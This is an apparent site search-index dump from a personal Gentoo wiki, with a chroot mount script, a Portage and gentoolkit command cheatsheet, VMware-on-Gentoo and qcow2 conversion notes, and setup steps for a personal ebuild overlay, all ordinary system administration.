inside the new system, at which point this path issue will disappear. #!/bin/bash mount --types proc /proc /mnt/gentoo/proc mount --rbind /sys /mnt/gentoo/sys mount --make-rslave /mnt/gentoo/sys mount --rbind /dev /mnt/gentoo/dev mount --make-rslave /mnt/gentoo/dev mount --bind /run /mnt/gentoo/run mount --make-slave /mnt/gentoo/run chroot /mnt/gentoo /bin/bash source /etc/profile export PS1 = \"(chroot) $PS1 \"","title":"gentoo-chroot"},{"location":"gentoo/gentoo-chroot/#gentoo-chroot","text":"Important Remember that if you subsequently use the target machine directly at its keyboard (rather than through the ssh/screen combination as here), you'll be working outside of the chroot, and all your paths will be incorrect (e.g. the new system will still appear at /mnt/gentoo/). It's an easy mistake to make, hence the renaming of the prompts. Once the kernel is built and the machine rebooted, we'll be 'natively' inside the new system, at which point this path issue will disappear. #!/bin/bash mount --types proc /proc /mnt/gentoo/proc mount --rbind /sys /mnt/gentoo/sys mount --make-rslave /mnt/gentoo/sys mount --rbind /dev /mnt/gentoo/dev mount --make-rslave /mnt/gentoo/dev mount --bind /run /mnt/gentoo/run mount --make-slave /mnt/gentoo/run chroot /mnt/gentoo /bin/bash source /etc/profile export PS1 = \"(chroot) $PS1 \"","title":"gentoo-chroot"},{"location":"gentoo/gentoo-tools/","text":"gentoo-cheatsheet Here is my personal wiki I created during years when I worked with Gentoo shell, feel free to use/copy/link this wiki as you wish but please add a url to my wiki. qxpak manipulate xpak archives qkeyword list packages based on keywords qsize calculate size usage qlop emerge log analyzer quse find pkgs using useflags & print useflag description and much more qtegrity verify files with IMA qsearch search packages and descriptions and much more really really quick but its not faster then eix yet qsearch vs eix qcheck verify integrity of installed packages qwhich as which but for gentoo ebuild and packages qgrep like RipGrep or The Silver Searcherbut for Gentoo ebuilds qmanifest verify or generate thick Manifest files gpg signature is invalid I doing this readme while I wait for portage to be finished and all is cool :) qatom qfile list all pkgs owning files qpkg create or manipulate Gentoo binpkgs qtbz2 qdepends show dependency info eshowkw Display keywords for specified package or for package that is in pwd eshowkw is i from gentoolkit package and is not in stage3 Sync and update Portage tree via emerge emerge --sync Sync and update Portage tree via eix eix-sync -a ; eix-update -a Sync all repositories that are set to auto-sync including the Gentoo ebuild repository emaint -a sync Sync the Gentoo ebuild repository using the mirrors by obtaining a snapshot that is (at most) a day old: emerge-webrsync Upgrade entire system emerge -avuDN --with-bdeps y --keep-going world Upgrade all installed packages, dependencies, and deep dependencies that are outdated or have USE flag changes emerge -uDU --keep-going --with-bdeps = y @world Run if you edited any use flags emerge --update --changed-use --deep --quiet @world Install a package but excluding it from the world file emerge --oneshot www-client/firefox List what packages would be installed without installing them: emerge -pv www-client/firefox Ask portage what would be installed when installing firefox emerge -a www-client/firefox Make configuration files up-2-date if needed etc-update Fix static library lafilefixer --justfixit | grep -v skipping Remove packages no longer needed: emerge -av --depclean Reverse dynamic library Dependency revdep-rebuild Clean old distfiles eclean -d distfiles List installed packages qlist -IRv List installed packages more clean qlist -I Obtain descriptions and usage of the USE flag X using euse: euse -i X Obtain a description of the png USE flag: euse -i | grep png Show what packages have the mysql USE flag: equery hasuse mysql Show what packages are currently built with the mysql USE flag: eix --installed-with-use mysql Show what USE flags are available for a specific package: equery uses <package-name> View the last 10 emerges (installs): genlop -l | tail -n 10 View how long emerging LibreOffice took: genlop -t libreoffice Estimate how long emerge -uND \u2013with-bdeps=y @world will take: emerge -pU @world | genlop --pretend Watch the latest merging ebuild during system upgrades: watch genlop -unc List all existing overlays: eselect repository list List all installed overlays: eselect repository list -i Sync layman repos layman -S List all existing overlays: layman -L List all installed overlays: layman -l Show packages explicitly installed. cat /var/lib/portage/world to show all the installed packages, including dependencies. equery list * Read news about Portage updates. eselect news read Search for a package to see what exists. emerge -s package Like above, except it will search all the descriptive text in addition to the package name. Note that Regular Expressions are used for this search. emerge -S package To see the effect of USE flags on the specified package (requires gentoolkit). equery uses package Pretend to install a package, in order to show a preview of the dependencies, etc. that will be installed in total. emerge -p package Like above, except it will ask to proceed after showing a preview of what will happen. emerge -a package to install quietly, omitting all the technical compilation output. emerge -q package to update all packages explicitly installed, as well as their dependencies and their build dependencies, pretending at first. ```sh emerge -uD \u2013with-bdeps=y @world -p ### like above, except changes to USE flags will also be considered in determining what needs to be re-built. emerge -uDN --with-bdeps=y @world -p # to resolve changes to config files made by Portage updates. etc-update View Portage logs. eread Choose which version of C++ compiler to use. gcc-config Rebuild the \"toolchain\" after changing which version of C++ compiler to use. env-update && source /etc/profile && emerge binutils glibc -1q emerge -Ca package Remove a package. emerge -ca ( --depclean --ask ) Remove unneeded dependencies. emerge @preserved-rebuild Rebuild packages whose (dynamically linked) dependencies are no longer needed and have been removed (requires gentoolkit), pretending at first. revdep-rebuild -p # to delete leftover package installation/build files; destructive means to remove stuff except for packages explicitly installed, pretending at first. eclean -d -p distfiles Delete leftover package installation/build files, regardless of whether you might want them again. rm /usr/portage/distfiles/* Choose a version of the kernel source. eselect kernel Configure kernel. cd /usr/src/linux && make menuconfig Show which services are started in which runlevels, including those inactive. rc-config list Show which services are started in which runlevels, in a slightly different format. rc-update Add a service, such as apache2, to a runlevel, such as default, so that it gets started when the computer boots up. rc-update add service runlevel Show which services are currently running. rc-status Restart a service. Besides restart, you can also start, stop, etc. /etc/init.d/service restart Find packages not installed by portage find /usr/bin | xargs -I {} qfile -o {} root # quse -D terminal app-editors/gedit-plugins [ terminal ] Embed a terminal in the bottom pane app-editors/vim [ terminal ] Enable terminal emulation support dev-qt/qt-creator [ serialterminal ] Build the serial terminal plugin dev-util/anjuta [ terminal ] Enable terminal plugin based on x11-libs/vte lxqt-base/lxqt-meta [ terminal ] Install x11-terms/qterminal package mate-extra/caja-extensions [ open-terminal ] Add an extension to support an open terminal. Warning Remember that if you subsequently use the target machine directly at its keyboard, you'll be working outside of the chroot, and all your paths will be incorrect (e.g. the new system will still appear at /mnt/gentoo/). It's an easy mistake to make, hence the renaming of the prompts. Once the kernel is built and the machine rebooted, we'll be 'natively' inside the new system, at which point this path issue will disappear. #!/bin/bash mount --types proc /proc /mnt/gentoo/proc mount --rbind /sys /mnt/gentoo/sys mount --make-rslave /mnt/gentoo/sys mount --rbind /dev /mnt/gentoo/dev mount --make-rslave /mnt/gentoo/dev mount --bind /run /mnt/gentoo/run mount --make-slave /mnt/gentoo/run chroot /mnt/gentoo /bin/bash source /etc/profile export PS1 = \"(chroot) $PS1 \" Doing same things over and over and over again is boring, adding this part for myself so I can copy and paste when I installing Gentoo Doing this 1 time / month for different users/companies so if you reading this and installing gentoo. This is the last part beforing we we mounting the folders above and jumping in to our new enviroment/setup cp /mnt/usb/install/portage/make.conf /mnt/gentoo/etc/portage/ mkdir -p -v /mnt/gentoo/etc/portage/repos.conf cp -v /mnt/gentoo/usr/share/portage/config/repos.conf /mnt/gentoo/etc/portage/repos.conf/gentoo.conf emerge sys-kernel/gentoo-sources sys-kernel/genkernel sys-boot/grub:2 app-portage/gentoolkit app-editors/vim sys-apps/ripgrep-all sys-process/parallel sys-fs/cryptsetup wpa_supplicant net-analyzer/netcat app-arch/atool app-arch/p7zip printf '### Gentoo Kernel\\n%s\\n\\n### Genkernel for initramfs \\n%s\\n\\n### Grub:2 as bootloader\\n%s\\n\\n' \\ 'sys-kernel/gentoo-sources symlink' \\ 'sys-kernel/genkernel cryptsetup' \\ 'sys-boot/grub:2 device-mapper' \\ 'app-arch/p7zip rar' > /etc/portage/package.use/elitebook_useflags eix-update eix-sync -a emerge --oneshot sys-apps/portage","title":"gentoo-cheatsheet"},{"location":"gentoo/gentoo-tools/#gentoo-cheatsheet","text":"Here is my personal wiki I created during years when I worked with Gentoo shell, feel free to use/copy/link this wiki as you wish but please add a url to my wiki.","title":"gentoo-cheatsheet"},{"location":"gentoo/gentoo-tools/#qxpak","text":"manipulate xpak archives","title":"qxpak"},{"location":"gentoo/gentoo-tools/#qkeyword","text":"list packages based on keywords","title":"qkeyword"},{"location":"gentoo/gentoo-tools/#qsize","text":"calculate size usage","title":"qsize"},{"location":"gentoo/gentoo-tools/#qlop","text":"emerge log analyzer","title":"qlop"},{"location":"gentoo/gentoo-tools/#quse","text":"find pkgs using useflags & print useflag description and much more","title":"quse"},{"location":"gentoo/gentoo-tools/#qtegrity","text":"verify files with IMA","title":"qtegrity"},{"location":"gentoo/gentoo-tools/#qsearch","text":"search packages and descriptions and much more really really quick but its not faster then eix yet qsearch vs eix","title":"qsearch"},{"location":"gentoo/gentoo-tools/#qcheck","text":"verify integrity of installed packages","title":"qcheck"},{"location":"gentoo/gentoo-tools/#qwhich","text":"as which but for gentoo ebuild and packages","title":"qwhich"},{"location":"gentoo/gentoo-tools/#qgrep","text":"like RipGrep or The Silver Searcherbut for Gentoo ebuilds","title":"qgrep"},{"location":"gentoo/gentoo-tools/#qmanifest","text":"verify or generate thick Manifest files","title":"qmanifest"},{"location":"gentoo/gentoo-tools/#gpg-signature-is-invalid","text":"I doing this readme while I wait for portage to be finished and all is cool :)","title":"gpg signature is invalid"},{"location":"gentoo/gentoo-tools/#qatom","text":"","title":"qatom"},{"location":"gentoo/gentoo-tools/#qfile","text":"list all pkgs owning files","title":"qfile"},{"location":"gentoo/gentoo-tools/#qpkg","text":"create or manipulate Gentoo binpkgs","title":"qpkg"},{"location":"gentoo/gentoo-tools/#qtbz2","text":"","title":"qtbz2"},{"location":"gentoo/gentoo-tools/#qdepends","text":"show dependency info","title":"qdepends"},{"location":"gentoo/gentoo-tools/#eshowkw","text":"Display keywords for specified package or for package that is in pwd eshowkw is i from gentoolkit package and is not in stage3","title":"eshowkw"},{"location":"gentoo/gentoo-tools/#sync-and-update-portage-tree-via-emerge","text":"emerge --sync","title":"Sync and update Portage tree via emerge"},{"location":"gentoo/gentoo-tools/#sync-and-update-portage-tree-via-eix","text":"eix-sync -a ; eix-update -a","title":"Sync and update Portage tree via eix"},{"location":"gentoo/gentoo-tools/#sync-all-repositories-that-are-set-to-auto-sync-including-the-gentoo-ebuild-repository","text":"emaint -a sync","title":"Sync all repositories that are set to auto-sync including the Gentoo ebuild repository"},{"location":"gentoo/gentoo-tools/#sync-the-gentoo-ebuild-repository-using-the-mirrors-by-obtaining-a-snapshot-that-is-at-most-a-day-old","text":"emerge-webrsync","title":"Sync the Gentoo ebuild repository using the mirrors by obtaining a snapshot that is (at most) a day old:"},{"location":"gentoo/gentoo-tools/#upgrade-entire-system","text":"emerge -avuDN --with-bdeps y --keep-going world","title":"Upgrade entire system"},{"location":"gentoo/gentoo-tools/#upgrade-all-installed-packages-dependencies-and-deep-dependencies-that-are-outdated-or-have-use-flag-changes","text":"emerge -uDU --keep-going --with-bdeps = y @world","title":"Upgrade all installed packages, dependencies, and deep dependencies that are outdated or have USE flag changes"},{"location":"gentoo/gentoo-tools/#run-if-you-edited-any-use-flags","text":"emerge --update --changed-use --deep --quiet @world","title":"Run if you edited any use flags"},{"location":"gentoo/gentoo-tools/#install-a-package-but-excluding-it-from-the-world-file","text":"emerge --oneshot www-client/firefox","title":"Install a package but excluding it from the world file"},{"location":"gentoo/gentoo-tools/#list-what-packages-would-be-installed-without-installing-them","text":"emerge -pv www-client/firefox","title":"List what packages would be installed without installing them:"},{"location":"gentoo/gentoo-tools/#ask-portage-what-would-be-installed-when-installing-firefox","text":"emerge -a www-client/firefox","title":"Ask portage what would be installed when installing firefox"},{"location":"gentoo/gentoo-tools/#make-configuration-files-up-2-date-if-needed","text":"etc-update","title":"Make configuration files up-2-date if needed"},{"location":"gentoo/gentoo-tools/#fix-static-library","text":"lafilefixer --justfixit | grep -v skipping","title":"Fix static library"},{"location":"gentoo/gentoo-tools/#remove-packages-no-longer-needed","text":"emerge -av --depclean","title":"Remove packages no longer needed:"},{"location":"gentoo/gentoo-tools/#reverse-dynamic-library-dependency","text":"revdep-rebuild","title":"Reverse dynamic library Dependency"},{"location":"gentoo/gentoo-tools/#clean-old-distfiles","text":"eclean -d distfiles","title":"Clean old distfiles"},{"location":"gentoo/gentoo-tools/#list-installed-packages","text":"qlist -IRv","title":"List installed packages"},{"location":"gentoo/gentoo-tools/#list-installed-packages-more-clean","text":"qlist -I","title":"List installed packages more clean"},{"location":"gentoo/gentoo-tools/#obtain-descriptions-and-usage-of-the-use-flag-x-using-euse","text":"euse -i X","title":"Obtain descriptions and usage of the USE flag X using euse:"},{"location":"gentoo/gentoo-tools/#obtain-a-description-of-the-png-use-flag","text":"euse -i | grep png","title":"Obtain a description of the png USE flag:"},{"location":"gentoo/gentoo-tools/#show-what-packages-have-the-mysql-use-flag","text":"equery hasuse mysql","title":"Show what packages have the mysql USE flag:"},{"location":"gentoo/gentoo-tools/#show-what-packages-are-currently-built-with-the-mysql-use-flag","text":"eix --installed-with-use mysql","title":"Show what packages are currently built with the mysql USE flag:"},{"location":"gentoo/gentoo-tools/#show-what-use-flags-are-available-for-a-specific-package","text":"equery uses <package-name>","title":"Show what USE flags are available for a specific package:"},{"location":"gentoo/gentoo-tools/#view-the-last-10-emerges-installs","text":"genlop -l | tail -n 10","title":"View the last 10 emerges (installs):"},{"location":"gentoo/gentoo-tools/#view-how-long-emerging-libreoffice-took","text":"genlop -t libreoffice","title":"View how long emerging LibreOffice took:"},{"location":"gentoo/gentoo-tools/#estimate-how-long-emerge--und---with-bdepsy-world-will-take","text":"emerge -pU @world | genlop --pretend","title":"Estimate how long emerge -uND --with-bdeps=y @world will take:"},{"location":"gentoo/gentoo-tools/#watch-the-latest-merging-ebuild-during-system-upgrades","text":"watch genlop -unc","title":"Watch the latest merging ebuild during system upgrades:"},{"location":"gentoo/gentoo-tools/#list-all-existing-overlays","text":"eselect repository list","title":"List all existing overlays:"},{"location":"gentoo/gentoo-tools/#list-all-installed-overlays","text":"eselect repository list -i","title":"List all installed overlays:"},{"location":"gentoo/gentoo-tools/#sync-layman-repos","text":"layman -S","title":"Sync layman repos"},{"location":"gentoo/gentoo-tools/#list-all-existing-overlays_1","text":"layman -L","title":"List all existing overlays:"},{"location":"gentoo/gentoo-tools/#list-all-installed-overlays_1","text":"layman -l","title":"List all installed overlays:"},{"location":"gentoo/gentoo-tools/#show-packages-explicitly-installed","text":"cat /var/lib/portage/world","title":"Show packages explicitly installed."},{"location":"gentoo/gentoo-tools/#to-show-all-the-installed-packages-including-dependencies","text":"equery list *","title":"to show all the installed packages, including dependencies."},{"location":"gentoo/gentoo-tools/#read-news-about-portage-updates","text":"eselect news read","title":"Read news about Portage updates."},{"location":"gentoo/gentoo-tools/#search-for-a-package-to-see-what-exists","text":"emerge -s package","title":"Search for a package to see what exists."},{"location":"gentoo/gentoo-tools/#like-above-except-it-will-search-all-the-descriptive-text-in-addition-to-the-package-name-note-that-regular-expressions-are-used-for-this-search","text":"emerge -S package","title":"Like above, except it will search all the descriptive text in addition to the package name. Note that Regular Expressions are used for this search."},{"location":"gentoo/gentoo-tools/#to-see-the-effect-of-use-flags-on-the-specified-package-requires-gentoolkit","text":"equery uses package","title":"To see the effect of USE flags on the specified package (requires gentoolkit)."},{"location":"gentoo/gentoo-tools/#pretend-to-install-a-package-in-order-to-show-a-preview-of-the-dependencies-etc-that-will-be-installed-in-total","text":"emerge -p package","title":"Pretend to install a package, in order to show a preview of the dependencies, etc. that will be installed in total."},{"location":"gentoo/gentoo-tools/#like-above-except-it-will-ask-to-proceed-after-showing-a-preview-of-what-will-happen","text":"emerge -a package","title":"Like above, except it will ask to proceed after showing a preview of what will happen."},{"location":"gentoo/gentoo-tools/#to-install-quietly-omitting-all-the-technical-compilation-output","text":"emerge -q package","title":"to install quietly, omitting all the technical compilation output."},{"location":"gentoo/gentoo-tools/#to-update-all-packages-explicitly-installed-as-well-as-their-dependencies-and-their-build-dependencies-pretending-at-first","text":"```sh emerge -uD \u2013with-bdeps=y @world -p ### like above, except changes to USE flags will also be considered in determining what needs to be re-built. emerge -uDN --with-bdeps=y @world -p #","title":"to update all packages explicitly installed, as well as their dependencies and their build dependencies, pretending at first."},{"location":"gentoo/gentoo-tools/#to-resolve-changes-to-config-files-made-by-portage-updates","text":"etc-update","title":"to resolve changes to config files made by Portage updates."},{"location":"gentoo/gentoo-tools/#view-portage-logs","text":"eread","title":"View Portage logs."},{"location":"gentoo/gentoo-tools/#choose-which-version-of-c-compiler-to-use","text":"gcc-config","title":"Choose which version of C++ compiler to use."},{"location":"gentoo/gentoo-tools/#rebuild-the-toolchain-after-changing-which-version-of-c-compiler-to-use","text":"env-update && source /etc/profile && emerge binutils glibc -1q emerge -Ca package","title":"Rebuild the \"toolchain\" after changing which version of C++ compiler to use."},{"location":"gentoo/gentoo-tools/#remove-a-package","text":"emerge -ca ( --depclean --ask )","title":"Remove a package."},{"location":"gentoo/gentoo-tools/#remove-unneeded-dependencies","text":"emerge @preserved-rebuild","title":"Remove unneeded dependencies."},{"location":"gentoo/gentoo-tools/#rebuild-packages-whose-dynamically-linked-dependencies-are-no-longer-needed-and-have-been-removed-requires-gentoolkit-pretending-at-first","text":"revdep-rebuild -p #","title":"Rebuild packages whose (dynamically linked) dependencies are no longer needed and have been removed (requires gentoolkit), pretending at first."},{"location":"gentoo/gentoo-tools/#to-delete-leftover-package-installationbuild-files-destructive-means-to-remove-stuff-except-for-packages-explicitly-installed-pretending-at-first","text":"eclean -d -p distfiles","title":"to delete leftover package installation/build files; destructive means to remove stuff except for packages explicitly installed, pretending at first."},{"location":"gentoo/gentoo-tools/#delete-leftover-package-installationbuild-files-regardless-of-whether-you-might-want-them-again","text":"rm /usr/portage/distfiles/*","title":"Delete leftover package installation/build files, regardless of whether you might want them again."},{"location":"gentoo/gentoo-tools/#choose-a-version-of-the-kernel-source","text":"eselect kernel","title":"Choose a version of the kernel source."},{"location":"gentoo/gentoo-tools/#configure-kernel","text":"cd /usr/src/linux && make menuconfig","title":"Configure kernel."},{"location":"gentoo/gentoo-tools/#show-which-services-are-started-in-which-runlevels-including-those-inactive","text":"rc-config list","title":"Show which services are started in which runlevels, including those inactive."},{"location":"gentoo/gentoo-tools/#show-which-services-are-started-in-which-runlevels-in-a-slightly-different-format","text":"rc-update","title":"Show which services are started in which runlevels, in a slightly different format."},{"location":"gentoo/gentoo-tools/#add-a-service-such-as-apache2-to-a-runlevel-such-as-default-so-that-it-gets-started-when-the-computer-boots-up","text":"rc-update add service runlevel","title":"Add a service, such as apache2, to a runlevel, such as default, so that it gets started when the computer boots up."},{"location":"gentoo/gentoo-tools/#show-which-services-are-currently-running","text":"rc-status","title":"Show which services are currently running."},{"location":"gentoo/gentoo-tools/#restart-a-service-besides-restart-you-can-also-start-stop-etc","text":"/etc/init.d/service restart","title":"Restart a service. Besides restart, you can also start, stop, etc."},{"location":"gentoo/gentoo-tools/#find-packages-not-installed-by-portage","text":"find /usr/bin | xargs -I {} qfile -o {} root # quse -D terminal app-editors/gedit-plugins [ terminal ] Embed a terminal in the bottom pane app-editors/vim [ terminal ] Enable terminal emulation support dev-qt/qt-creator [ serialterminal ] Build the serial terminal plugin dev-util/anjuta [ terminal ] Enable terminal plugin based on x11-libs/vte lxqt-base/lxqt-meta [ terminal ] Install x11-terms/qterminal package mate-extra/caja-extensions [ open-terminal ] Add an extension to support an open terminal. Warning Remember that if you subsequently use the target machine directly at its keyboard, you'll be working outside of the chroot, and all your paths will be incorrect (e.g. the new system will still appear at /mnt/gentoo/). It's an easy mistake to make, hence the renaming of the prompts. Once the kernel is built and the machine rebooted, we'll be 'natively' inside the new system, at which point this path issue will disappear. #!/bin/bash mount --types proc /proc /mnt/gentoo/proc mount --rbind /sys /mnt/gentoo/sys mount --make-rslave /mnt/gentoo/sys mount --rbind /dev /mnt/gentoo/dev mount --make-rslave /mnt/gentoo/dev mount --bind /run /mnt/gentoo/run mount --make-slave /mnt/gentoo/run chroot /mnt/gentoo /bin/bash source /etc/profile export PS1 = \"(chroot) $PS1 \" Doing same things over and over and over again is boring, adding this part for myself so I can copy and paste when I installing Gentoo Doing this 1 time / month for different users/companies so if you reading this and installing gentoo. This is the last part beforing we we mounting the folders above and jumping in to our new enviroment/setup cp /mnt/usb/install/portage/make.conf /mnt/gentoo/etc/portage/ mkdir -p -v /mnt/gentoo/etc/portage/repos.conf cp -v /mnt/gentoo/usr/share/portage/config/repos.conf /mnt/gentoo/etc/portage/repos.conf/gentoo.conf emerge sys-kernel/gentoo-sources sys-kernel/genkernel sys-boot/grub:2 app-portage/gentoolkit app-editors/vim sys-apps/ripgrep-all sys-process/parallel sys-fs/cryptsetup wpa_supplicant net-analyzer/netcat app-arch/atool app-arch/p7zip printf '### Gentoo Kernel\\n%s\\n\\n### Genkernel for initramfs \\n%s\\n\\n### Grub:2 as bootloader\\n%s\\n\\n' \\ 'sys-kernel/gentoo-sources symlink' \\ 'sys-kernel/genkernel cryptsetup' \\ 'sys-boot/grub:2 device-mapper' \\ 'app-arch/p7zip rar' > /etc/portage/package.use/elitebook_useflags eix-update eix-sync -a emerge --oneshot sys-apps/portage","title":"Find packages not installed by portage"},{"location":"gentoo/gentoo-update/","text":"gentoo-wupdate wupdate is a simple tool for make life easier when working with portage","title":"gentoo-wupdate"},{"location":"gentoo/gentoo-update/#gentoo-wupdate","text":"wupdate is a simple tool for make life easier when working with portage","title":"gentoo-wupdate"},{"location":"gentoo/gentoo-vmware/","text":"gentoo-vmware From vmware > qcow2 The only file we care about though is the *.vmdk file as that is the one with the actual image We will be converting the vmdk to qcow2, really simple: tar -xvf original.ova qemu-img convert -O qcow2 win10.vmdk win10.qcow2 qemu-system-x86_64 -enable-kvm -cpu host -smp 4 -device usb-ehci,id = ehci -device qemu-xhci,id = xhci -device usb-tablet,bus = xhci.0 -net nic -net user -m 4192 -cdrom win10.qcow2 And vice versa, qcow2 into a vmware vmdk file: qemu-img convert -f qcow2 -O vmdk windows.11.qcow2 windows.11.vmdk How to import the vmdk into vmware-workstation you should know if you went this far It's amazing, I love virtual machines :) Nowadays (Releases from ~2020>) This has been a really tricky thing to get installed on Gentoo back in the days but last year it have become really easy Install the vmware bundle file by ./vmware-vxxx.bundle Once done, setup everything and when you will power up the guest machine it probably will cry over for vmmon and vmnet is not enabled in kernel config. Since recently ou wont find any settings in /usr/src/linux/.config for this, instead, execute below command for get everything installed: vmware-modconfig --console --install-all Wait until its done and you will have a working vmware workstation setup on your Gentoo Machine: Starting VMware services: Virtual machine monitor done Virtual machine communication interface done VM communication interface socket family done Virtual ethernet done VMware Authentication Daemon done Shared Memory Available done Full output from the command above is found @ https://pastebin.com/raw/vPfv7u3s Enjoy vmware, it pwnz with a Legit License! :) Older Releases (Releases from <~2020) This is how I got vmware-workstation working on v12.5.9 Once you installed everything and things just hassles for you about modules and shit, it toke ages to figure out below: VMWARE_VERSION = workstation-12.5.9 TMP_FOLDER = /tmp/patch-vmware rm -fdr $TMP_FOLDER mkdir -p $TMP_FOLDER cd $TMP_FOLDER git clone https://github.com/mkubecek/vmware-host-modules.git cd $TMP_FOLDER /vmware-host-modules git checkout $VMWARE_VERSION git fetch make sudo make install sudo rm /usr/lib/vmware/lib/libz.so.1/libz.so.1 sudo ln -s /lib/x86_64-linux-gnu/libz.so.1 /usr/lib/vmware/lib/libz.so.1/libz.so.1 You will now have a working vmware setup, but ey. Use the latest versions to avoid all the trouble with the above shit. Network Stuff Settings for your NAT and other net configurations is available in: /etc/vmware/vmnet8/nat/nat.conf /usr/bin/vmnet-bridge -s 12 -d /var/run/vmnet-bridge-0.pid -n 0 /usr/bin/vmnet-netifup -s 12 -d /var/run/vmnet-netifup-vmnet1.pid /dev/vmnet1 vmnet1 /usr/bin/vmnet-dhcpd -s 12 -cf /etc/vmware/vmnet1/dhcpd/dhcpd.conf -lf /etc/vmware/vmnet1/dhcpd/dhcpd.leases -pf /var/run/vmnet-dhcpd-vmnet1.pid vmnet1 /usr/bin/vmnet-natd -s 12 -m /etc/vmware/vmnet8/nat.mac -c /etc/vmware/vmnet8/nat/nat.conf /usr/bin/vmnet-netifup -s 12 -d /var/run/vmnet-netifup-vmnet8.pid /dev/vmnet8 vmnet8 /usr/bin/vmnet-dhcpd -s 12 -cf /etc/vmware/vmnet8/dhcpd/dhcpd.conf -lf /etc/vmware/vmnet8/dhcpd/dhcpd.leases -pf /var/run/vmnet-dhcpd-vmnet8.pid vmnet8 Fuse mount /usr/bin/vmware-fuseUI -s -r 8 -w 11 -p 23019 Launch vmware from cli /usr/lib/vmware/bin/vmware-vmx -s vmx.stdio.keep = TRUE -# \\ product = 1 ; name = VMware Workstation ; version = 16 .1.1 ; buildnumber = 17801498 ; licensename = VMware \\ Workstation ; licenseversion = 16 .0 ; -@ duplex = 3 ; msgs = ui \\ /path/to/Windows_10_x64_Enterprise/Windows 10 x64 Enterprise.vmx","title":"gentoo-vmware"},{"location":"gentoo/gentoo-vmware/#gentoo-vmware","text":"","title":"gentoo-vmware"},{"location":"gentoo/gentoo-vmware/#from-vmware--qcow2","text":"The only file we care about though is the *.vmdk file as that is the one with the actual image We will be converting the vmdk to qcow2, really simple: tar -xvf original.ova qemu-img convert -O qcow2 win10.vmdk win10.qcow2 qemu-system-x86_64 -enable-kvm -cpu host -smp 4 -device usb-ehci,id = ehci -device qemu-xhci,id = xhci -device usb-tablet,bus = xhci.0 -net nic -net user -m 4192 -cdrom win10.qcow2 And vice versa, qcow2 into a vmware vmdk file: qemu-img convert -f qcow2 -O vmdk windows.11.qcow2 windows.11.vmdk How to import the vmdk into vmware-workstation you should know if you went this far It's amazing, I love virtual machines :)","title":"From vmware &gt; qcow2"},{"location":"gentoo/gentoo-vmware/#nowadays-releases-from-2020","text":"This has been a really tricky thing to get installed on Gentoo back in the days but last year it have become really easy Install the vmware bundle file by ./vmware-vxxx.bundle Once done, setup everything and when you will power up the guest machine it probably will cry over for vmmon and vmnet is not enabled in kernel config. Since recently ou wont find any settings in /usr/src/linux/.config for this, instead, execute below command for get everything installed: vmware-modconfig --console --install-all Wait until its done and you will have a working vmware workstation setup on your Gentoo Machine: Starting VMware services: Virtual machine monitor done Virtual machine communication interface done VM communication interface socket family done Virtual ethernet done VMware Authentication Daemon done Shared Memory Available done Full output from the command above is found @ https://pastebin.com/raw/vPfv7u3s Enjoy vmware, it pwnz with a Legit License! :)","title":"Nowadays (Releases from ~2020&gt;)"},{"location":"gentoo/gentoo-vmware/#older-releases-releases-from-2020","text":"","title":"Older Releases (Releases from &lt;~2020)"},{"location":"gentoo/gentoo-vmware/#this-is-how-i-got-vmware-workstation-working-on-v1259","text":"Once you installed everything and things just hassles for you about modules and shit, it toke ages to figure out below: VMWARE_VERSION = workstation-12.5.9 TMP_FOLDER = /tmp/patch-vmware rm -fdr $TMP_FOLDER mkdir -p $TMP_FOLDER cd $TMP_FOLDER git clone https://github.com/mkubecek/vmware-host-modules.git cd $TMP_FOLDER /vmware-host-modules git checkout $VMWARE_VERSION git fetch make sudo make install sudo rm /usr/lib/vmware/lib/libz.so.1/libz.so.1 sudo ln -s /lib/x86_64-linux-gnu/libz.so.1 /usr/lib/vmware/lib/libz.so.1/libz.so.1 You will now have a working vmware setup, but ey. Use the latest versions to avoid all the trouble with the above shit.","title":"This is how I got vmware-workstation working on v12.5.9"},{"location":"gentoo/gentoo-vmware/#network-stuff","text":"Settings for your NAT and other net configurations is available in: /etc/vmware/vmnet8/nat/nat.conf /usr/bin/vmnet-bridge -s 12 -d /var/run/vmnet-bridge-0.pid -n 0 /usr/bin/vmnet-netifup -s 12 -d /var/run/vmnet-netifup-vmnet1.pid /dev/vmnet1 vmnet1 /usr/bin/vmnet-dhcpd -s 12 -cf /etc/vmware/vmnet1/dhcpd/dhcpd.conf -lf /etc/vmware/vmnet1/dhcpd/dhcpd.leases -pf /var/run/vmnet-dhcpd-vmnet1.pid vmnet1 /usr/bin/vmnet-natd -s 12 -m /etc/vmware/vmnet8/nat.mac -c /etc/vmware/vmnet8/nat/nat.conf /usr/bin/vmnet-netifup -s 12 -d /var/run/vmnet-netifup-vmnet8.pid /dev/vmnet8 vmnet8 /usr/bin/vmnet-dhcpd -s 12 -cf /etc/vmware/vmnet8/dhcpd/dhcpd.conf -lf /etc/vmware/vmnet8/dhcpd/dhcpd.leases -pf /var/run/vmnet-dhcpd-vmnet8.pid vmnet8","title":"Network Stuff"},{"location":"gentoo/gentoo-vmware/#fuse-mount","text":"/usr/bin/vmware-fuseUI -s -r 8 -w 11 -p 23019","title":"Fuse mount"},{"location":"gentoo/gentoo-vmware/#launch-vmware-from-cli","text":"/usr/lib/vmware/bin/vmware-vmx -s vmx.stdio.keep = TRUE -# \\ product = 1 ; name = VMware Workstation ; version = 16 .1.1 ; buildnumber = 17801498 ; licensename = VMware \\ Workstation ; licenseversion = 16 .0 ; -@ duplex = 3 ; msgs = ui \\ /path/to/Windows_10_x64_Enterprise/Windows 10 x64 Enterprise.vmx","title":"Launch vmware from cli"},{"location":"gentoo/wuseman-overlay/","text":"README This is my personal Gentoo overlay for packages not added in portage tree and ebuilds I have not been able to find anywhere else. All ebuilds have been commited by 'repoman -dx commit'.. HOWTO Create wuseman-overlay.conf into /etc/portage/repos.conf/ cat << \"EOF\" > /etc/portage/repos.conf/wuseman-overlay.conf [ wuseman-overlay ] # Simple example 'overlaid' ebuild repository location = /var/db/repos/wuseman-overlay priority = 0 auto-sync = no #masters-gentoo EOF And run below commands for clone and sync wuseman-overlay mkdir -p /etc/portage/repos.conf/ { wuseman-overlay,metadata } echo -e \"masters = gentoo\" > /etc/portage/repos.conf/metadata/layout.conf echo -e 'LOCAL_PORTDIR=\"/etc/portage/repos.conf/\"' >> /etc/portage/make.conf git clone https://github.com/wuseman/wuseman-overlay /var/db/repos/wuseman-overlay which eix & > /dev/null ; [[ $? -eq 0 ]] && eix-sync ; eix-update || emerge --sync References https://github.com/gentoo/gentoo https://github.com/pentoo/pentoo-overlay CONTACT If you have problems, questions, ideas or suggestions please contact us by posting to 